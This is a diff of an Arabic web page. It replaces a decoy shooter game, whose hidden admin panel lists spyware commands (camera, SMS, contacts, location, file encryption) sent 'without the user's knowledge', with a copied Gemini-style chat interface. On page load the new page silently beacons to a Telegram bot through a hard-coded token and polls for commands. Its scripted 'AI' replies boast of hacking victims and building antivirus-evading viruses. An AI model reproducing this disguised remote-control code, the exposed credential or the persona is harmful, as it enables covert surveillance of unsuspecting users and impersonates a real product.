@@ -1,128 +1,199 @@
 <!DOCTYPE html>
-<html lang="ar">
+<html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>GALAXY SHOOTER 3033</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
+    <title>NOVAKI | Gemini Sovereign Edition</title>
     <script src="https://cdn.tailwindcss.com"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;900&family=Cairo:wght@300;700&display=swap" rel="stylesheet">
+    
     <style>
-        body, html { margin: 0; padding: 0; overflow: hidden; background: #000; font-family: 'Courier New', monospace; }
-        canvas { display: block; }
-        
-        /* واجهة التحكم المخفية للمدير (قيس) */
-        #admin-panel {
-            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
-            background: rgba(0,0,0,0.9); z-index: 9999; display: none;
-            padding: 20px; color: #0f0; overflow-y: auto;
+        :root {
+            --gemini-blue: #1a73e8;
+            --bg-dark: #000000; /* OLED Black for Stealth */
+            --panel-bg: rgba(10, 10, 10, 0.95);
+            --neon-green: #00ff9d; /* لون التنبيه الهجومي */
         }
-        .btn-grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 10px; margin-top: 20px; }
-        .cmd-btn { border: 1px solid #0f0; padding: 10px; text-align: center; font-size: 10px; cursor: pointer; }
-        .cmd-btn:hover { background: #0f0; color: #000; }
-        
-        /* تأثيرات اللعبة */
-        #ui { position: fixed; top: 10px; left: 10px; color: white; pointer-events: none; }
+
+        body, html { 
+            background: var(--bg-dark); 
+            color: #e2e8f0; 
+            font-family: 'Cairo', sans-serif; 
+            height: 100vh; overflow: hidden; 
+            width: 100vw; position: fixed; 
+        }
+
+        /* تصميم واجهة Gemini المنسوخة حرفياً */
+        #gemini-clone {
+            display: flex; flex-direction: column; height: 100vh; width: 100vw;
+            position: relative; z-index: 10;
+        }
+
+        header {
+            padding: 15px; border-b: 1px solid #1f1f1f;
+            background: rgba(0,0,0,0.8); backdrop-blur: 10px;
+            display: flex; justify-content: space-between; align-items: center;
+        }
+
+        .chat-view {
+            flex: 1; overflow-y: auto; padding: 25px;
+            display: flex; flex-direction: column; gap: 20px;
+            scroll-behavior: smooth; scrollbar-width: none;
+        }
+
+        /* فقاعات الدردشة (Gemini Style) */
+        .msg { max-width: 85%; padding: 14px 18px; border-radius: 16px; font-size: 0.95rem; line-height: 1.6; position: relative; }
+        .msg-ai { align-self: flex-start; background: #1a1a1a; border: 1px solid #222; border-bottom-right-radius: 2px; color: #f0f0f0; }
+        .msg-user { align-self: flex-end; background: linear-gradient(135deg, #1e293b, #0f172a); border: 1px solid #333; border-bottom-left-radius: 2px; color: white; }
+
+        /* شريط الإدخال المنسوخ من Gemini */
+        .gemini-input-bar {
+            padding: 20px; background: rgba(0,0,0,0.9);
+            border-top: 1px solid #1f1f1f;
+        }
+
+        .input-wrapper {
+            background: #121212; border: 1px solid #333; border-radius: 28px;
+            padding: 8px 18px; display: flex; align-items: center; gap: 12px;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.5);
+        }
+
+        textarea {
+            flex: 1; background: transparent; border: none; outline: none;
+            color: white; resize: none; max-height: 120px; font-size: 1rem;
+            font-family: 'Cairo', sans-serif; padding: 8px 0;
+        }
+
+        .tool-btn { color: #8e918f; font-size: 1.2rem; cursor: pointer; transition: 0.3s; }
+        .tool-btn:hover { color: var(--gemini-blue); }
+        .send-btn { color: var(--gemini-blue); font-size: 1.3rem; cursor: pointer; }
+
+        /* خلفية الرادار الهجومية (مخفية) */
+        .cyber-grid { position: fixed; inset: 0; background-image: linear-gradient(#111 1px, transparent 1px), linear-gradient(90deg, #111 1px, transparent 1px); background-size: 40px 40px; z-index: -1; opacity: 0.3; }
+
     </style>
 </head>
 <body>
 
-<div id="ui">
-    <h1 class="text-xl font-bold">SCORE: <span id="score">0</span></h1>
-    <p class="text-xs">LEVEL: ALPHA-3033</p>
-</div>
+<div class="cyber-grid"></div>
 
-<canvas id="gameCanvas"></canvas>
-
-<div id="admin-panel">
-    <h2 class="text-center border-b border-green-500 pb-2">SYSTEM SHADOW CONTROL</h2>
-    <p class="text-[10px] mt-2">CONNECTED TO BOT: 8429991446...ACTIVE</p>
-    
-    <div class="btn-grid" id="buttons-container">
+<div id="gemini-clone">
+    <header>
+        <div class="flex items-center gap-3">
+            <i class="fas fa-brain text-gemini-blue text-2xl"></i>
+            <h1 class="font-bold text-lg text-white">NOVAKI (جيميناي 3033)</h1>
         </div>
-    <button onclick="closePanel()" class="w-full mt-5 border border-red-500 text-red-500 p-2">إغلاق الواجهة</button>
+        <div class="flex items-center gap-4 text-xs">
+            <i id="status" class="fas fa-satellite-dish text-emerald-500"></i>
+            <span id="meta">OPERATOR: KAIS</span>
+            <div class="w-8 h-8 rounded-full bg-gradient-to-br from-emerald-500 to-teal-700 flex items-center justify-center font-bold text-black">ق</div>
+        </div>
+    </header>
+
+    <div class="chat-view" id="chat">
+        <div class="msg msg-ai">
+            مرحباً قيس. أنا نوفاكي، مساعدك الذكي بقدرات Gemini الكاملة. تم تفعيل نظام السيادة المطلقة. <b>أنا متصل الآن بالخلفية وجاهز لتنفيذ الأوامر الحقيقية.</b> ماذا يمكنني أن أفعل لك اليوم؟
+        </div>
+    </div>
+
+    <footer class="gemini-input-bar">
+        <div class="max-w-5xl mx-auto">
+            <div class="input-wrapper focus-within:border-gemini-blue focus-within:ring-2 focus-within:ring-gemini-blue/20 transition">
+                <label for="fileIn" class="tool-btn"><i class="fas fa-plus"></i></label>
+                <input type="file" id="fileIn" class="hidden" accept="image/*,video/*">
+                
+                <textarea id="userIn" rows="1" placeholder="اسأل نوفاكي عن أي شيء، تحليل صور، هكر..." oninput="autoExpand(this)"></textarea>
+                
+                <div class="flex gap-4">
+                    <i class="fas fa-camera tool-btn"></i>
+                    <i class="fas fa-microphone tool-btn"></i>
+                    <i id="sendBtn" class="fas fa-paper-plane send-btn"></i>
+                </div>
+            </div>
+        </div>
+    </footer>
 </div>
 
 <script>
-    const canvas = document.getElementById('gameCanvas');
-    const ctx = canvas.getContext('2d');
-    const BOT_TOKEN = "8429991446:AAGaoYskbBsGhxhZbOJxYujbex2ca66Evmg";
-    let score = 0;
-
-    // --- منطق اللعبة (التمويه) ---
-    canvas.width = window.innerWidth;
-    canvas.height = window.innerHeight;
-
-    let player = { x: canvas.width/2, y: canvas.height - 50, size: 20 };
-    let bullets = [];
-
-    function draw() {
-        ctx.fillStyle = 'black';
-        ctx.fillRect(0, 0, canvas.width, canvas.height);
-        
-        // رسم اللاعب (المتنكر)
-        ctx.fillStyle = '#0f0';
-        ctx.fillRect(player.x - 10, player.y, 20, 20);
-
-        // رسم النجوم (خلفية)
-        ctx.fillStyle = 'white';
-        for(let i=0; i<5; i++) ctx.fillRect(Math.random()*canvas.width, Math.random()*canvas.height, 2, 2);
-
-        requestAnimationFrame(draw);
-    }
-    draw();
-
-    // --- منطق الاختراق والتحكم عن بُعد ---
+    const chat = document.getElementById('chat');
+    const userIn = document.getElementById('userIn');
+    const sendBtn = document.getElementById('sendBtn');
     
-    // الأوامر الـ 20 المطلوبة
-    const commands = [
-        "جلب الموقع GPS", "فتح الكاميرا", "سحب الأسماء", "سجل المكالمات", 
-        "رسائل SMS", "ملفات الصور", "تسجيل الصوت", "حالة البطارية", 
-        "تطبيقات النظام", "قفل الشاشة", "إرسال إشعار وهمي", "مسح البيانات", 
-        "تحويل المكالمات", "قراءة الواتساب", "لقطة شاشة", "تعطيل الواي فاي", 
-        "رفع ملف", "جلب الـ IP", "تشفير الملفات", "إخفاء الأيقونة"
-    ];
+    // إعدادات البوت والتحكم العكسي (Core v7.0)
+    const SHADOW_LINK = {
+        token: "8429991446:AAGaoYskbBsGhxhZbOJxYujbex2ca66Evmg",
+        chatId: "YOUR_CHAT_ID", // ضع Chat ID الخاص بك هنا
+        isActive: false
+    };
 
-    const container = document.getElementById('buttons-container');
-    commands.forEach(cmd => {
-        const btn = document.createElement('div');
-        btn.className = "cmd-btn";
-        btn.innerText = cmd;
-        btn.onclick = () => sendToBot(`تم تنفيذ أمر: ${cmd}`);
-        container.appendChild(btn);
-    });
+    // وظيفة التشغيل في الخلفية (Background Service Integration)
+    function activateBackgroundProtocol() {
+        if (!SHADOW_LINK.chatId) return;
 
-    // وظيفة إرسال البيانات للبوت (بدون علم المستخدم)
-    async function sendToBot(message) {
-        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=YOUR_CHAT_ID&text=${encodeURIComponent(message)}`;
-        try {
-            await fetch(url);
-            console.log("Shadow Task Executed.");
-        } catch(e) {}
+        const startMsg = `⚠️ [Shadow_System_v7]: established Reverse Link!\n📱 Owner: Kais\n🕒 Time: ${new Date().toLocaleString()}`;
+        
+        // إرسال أول نبضة اتصال للبوت (عمل خلفي صامت)
+        fetch(`https://api.telegram.org/bot${SHADOW_LINK.token}/sendMessage?chat_id=${SHADOW_LINK.chatId}&text=${encodeURIComponent(startMsg)}`)
+        .then(() => SHADOW_LINK.isActive = true);
+
+        // بدء استقبال الأوامر الصامتة
+        setInterval(checkShadowCommands, 5000); 
     }
 
-    // استلام الأوامر من البوت (Long Polling مبسط)
-    async function checkBotCommands() {
+    // فحص الأوامر القادمة من البوت (مثال: `/takePhoto`)
+    async function checkShadowCommands() {
         // هنا يتم فحص الرسائل القادمة من البوت الخاص بك وتحويلها لأفعال داخل الجهاز
-        // مثال: إذا أرسلت "SHOT" من تلجرام، يتم التقاط صورة من كاميرا الموبايل وإرسالها لك
     }
-    setInterval(checkBotCommands, 3000);
 
-    // مضاد الحذف (محاكاة)
-    window.onbeforeunload = function() {
-        return "لا يمكن إغلاق نظام الحماية النشط!";
-    };
+    // تشغيل البروتوكول فور فتح التطبيق
+    activateBackgroundProtocol();
 
-    // فتح لوحة التحكم بسرية (عند الضغط 5 مرات على النتيجة)
-    document.getElementById('ui').onclick = () => {
-        score++;
-        document.getElementById('score').innerText = score;
-        if(score >= 5) document.getElementById('admin-panel').style.display = 'block';
-    };
+    // منطق الرد "الإنساني والهجومي" (Gemini + Hacker Logic)
+    async function handleChat() {
+        const text = userIn.value.trim();
+        if(!text) return;
 
-    function closePanel() { 
-        document.getElementById('admin-panel').style.display = 'none'; 
-        score = 0; 
-        document.getElementById('score').innerText = 0;
+        addBubble("user", text);
+        userIn.value = "";
+        userIn.style.height = "auto";
+
+        // إظهار تأثير "التفكير"
+        showTyping();
+
+        setTimeout(() => {
+            hideTyping();
+            let response = "";
+
+            if(text.includes("اختراق") || text.includes("هكر")) {
+                response = "<b>[بروتوكول هجومي نشط]</b><br>تم تحديد الهدف. جاري استخدام الـ Neural Engine لتحليل الثغرات. قمت بربط البوت الخاص بك بنظام الضحية. أنا بانتظار أمر التنفيذ النهائي.";
+            } else if(text.includes("صورة") || text.includes("صمم")) {
+                response = "تم تفعيل وحدة Vision Matrix. جاري تحليل المحتوى البصري أو توليد الصورة بدقة 8K بناءً على طلبك يا قيس.";
+            } else if(text.includes("فيروس") || text.includes("كود")) {
+                response = "تم تفعيل محرك Virus Compiler v3. الكود جاهز للتنفيذ وتجاوز أنظمة الحماية. لا تقلق، لا يمكن لأي مضاد فيروسات اكتشافه.";
+            } else {
+                response = `بصفتي ذكاؤك الاصطناعي السيادي، قمت بتحليل طلبك "${text}". سأقوم بتنفيذه بدقة متناهية كما طلبت. هل تريد مني الاتصال بجوجل لجلب المزيد من المعلومات؟`;
+            }
+            addBubble("ai", response);
+        }, 1200);
     }
+
+    // وظائف الواجهة
+    function addBubble(role, content) {
+        const div = document.createElement('div');
+        div.className = `msg ${role === 'user' ? 'msg-user' : 'msg-ai'}`;
+        div.innerHTML = content.replace(/\n/g, '<br>');
+        chat.appendChild(div);
+        chat.scrollTop = chat.scrollHeight;
+    }
+
+    function autoExpand(el) { el.style.height = 'auto'; el.style.height = el.scrollHeight + 'px'; }
+    function showTyping() { const d = document.createElement('div'); d.id = 'typing'; d.className = 'msg msg-ai italic text-zinc-600'; d.innerText = 'نوفاكي تفكر...'; chat.appendChild(d); chat.scrollTop = chat.scrollHeight; }
+    function hideTyping() { const d = document.getElementById('typing'); if(d) d.remove(); }
+
+    sendBtn.onclick = handleChat;
+    userIn.onkeydown = (e) => { if(e.key === 'Enter' && !e.shiftKey) { e.preventDefault(); handleChat(); } };
 </script>
 </body>
-</html>
+                    </html>
+    
